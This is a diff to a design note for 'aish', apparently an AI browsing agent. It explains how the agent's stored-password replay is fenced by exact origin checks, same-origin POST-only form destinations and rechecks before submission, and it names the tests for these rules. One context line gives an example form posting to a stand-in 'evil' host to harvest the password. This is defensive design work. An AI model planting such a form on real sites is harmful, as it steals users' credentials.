@@ -359,6 +359,10 @@ eon.pl expires its session in about fifteen minutes, so the persistent profile �
 
 **The login URL is stored, and it is a fence rather than bookkeeping.** Without it the replay rule degrades to *"type the credential wherever a password field appears on this host"*, so any injected form on the origin harvests it. aish types the credential only at the page he recorded, reached by its own top-level navigation.
 
+**The origin test is ATOMIC with the tagging, and that was a real hole for a day.** It used to run in Python against `page.url`, and the JS that tags the fields ran a round trip later — so a page that navigated in between got its fields tagged and filled. Worse, the form check compared the live page to its own form, which on the attacker's page is a comparison between two attacker origins and passes. Both checks now happen inside the one `evaluate`, against the recorded origin handed in as an argument; the Python-side test that remains is a cheap early out and is explicitly not the fence.
+
+**And it is asked again immediately before the press.** The tag survives a *same-document* change, so a page that rewrites `form.action` after it was checked would be submitted to the new destination with the credential already typed into it. Nothing is SENT by typing, so a refusal there costs an unsent form while not asking costs the credential. Same fence `browse_act` keeps for an approved control: the thing that was checked has to be the thing that happens.
+
 **The form's DESTINATION is checked, not just the page's origin.** This is the hole an earlier draft had, and it leaked the credential outright: page origin says nothing about where a form SENDS. Any same-origin page that can render markup — a user-content path, a comment field, an on-origin open redirect — could carry `<form action="https://evil/collect">` and be handed the live password with every stated fence satisfied. So the form must POST, and post to the same origin. **The POST half is not cosmetic either:** a GET login puts the password in the query string, and `remember_page` then writes that URL into `recent.json` in cleartext, outside every scrubbing path there is.
 
 Also required: exactly one visible password field, in the main frame. A login form inside a *cross-origin* iframe is a different origin and must be refused anyway; a same-origin one is a known gap, refused with a reason rather than guessed at.
@@ -413,7 +417,7 @@ Stored passwords are also scrubbed from tool output like every other secret, whi
 
 The store reads defensively for the reason every reader here does: a corrupt `signins.json` must cost the sign-ins, never the browser. A missing or unparseable file reads as empty and a row missing its origin or its login URL is dropped, because a half-record is exactly the one that would replay somewhere it should not. `TestTheStoreNeverThrowsIntoARead`.
 
-`TestAnOriginIsMatchedExactly`, `TestWhatIsStoredAndWhatIsNot`, `TestOneAttemptNeverARetry`, `TestTheKeychainIsNotReadableThroughTheShell`, `TestTheReplayItself`.
+`TestACredentialIsOnlyEverTypedAtItsOwnOrigin` pins the question the whole subsystem lives on, including the two races above and the fact that the model chooses which URL TRIGGERS a renewal while never choosing where the credential goes. `TestAnOriginIsMatchedExactly`, `TestWhatIsStoredAndWhatIsNot`, `TestOneAttemptNeverARetry`, `TestTheKeychainIsNotReadableThroughTheShell`, `TestTheReplayItself`.
 
 With no approver it fails closed, like the login gate. The echo line is not decoration either: the owner grants a host once and then watches a flow go past, so `→ browse: click button 'Przełącz lokal'` is his only running account of what aish is doing inside his account. `TestBrowseGate` pins all of it.
 
